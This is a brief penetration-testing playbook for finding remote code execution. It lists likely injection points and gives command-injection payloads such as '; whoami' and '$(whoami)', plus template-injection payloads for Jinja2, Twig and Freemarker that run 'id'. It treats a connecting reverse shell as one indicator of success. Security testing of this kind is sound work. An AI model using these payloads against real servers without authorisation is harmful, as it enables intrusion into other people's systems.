## RCE (Remote Code Execution) Playbook

**STRATEGY:** Find inputs that get executed as code/commands on the server.

### Steps
1. Find command execution points: ping tools, file operations, eval-like functions
2. Test command injection: `; whoami`, `| id`, `$(whoami)`
3. Check for code injection in templating engines
4. If command output appears or behavior changes → CONFIRMED
5. Use time-based detection: `; sleep 5` (5-second delay confirms RCE)

### Common Injection Points
- System administration tools (ping, traceroute, nslookup)
- File operations (filename, path parameters)
- PDF/image processing (ImageMagick, Ghostscript)
- Template engines (SSTI)
- Deserialization endpoints
- File upload with code execution

### Command Injection Payloads
- Semicolon: `; whoami`
- Pipe: `| id`
- Backticks: `` `whoami` ``
- Command substitution: `$(whoami)`
- Newline: `%0a whoami`
- AND/OR: `&& whoami`, `|| whoami`

### SSTI (Server-Side Template Injection)
- Jinja2: `{{7*7}}` → `49`, `{{config}}`
- Twig: `{{7*7}}`, `{{_self.env.display("id")}}`
- Freemarker: `${7*7}`, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- Velocity: `#set($x=7*7)$x`

### Indicators of Success
- Command output in response (username, system info)
- Time-based delay confirms blind execution
- File created/modified on server
- Reverse shell connects back
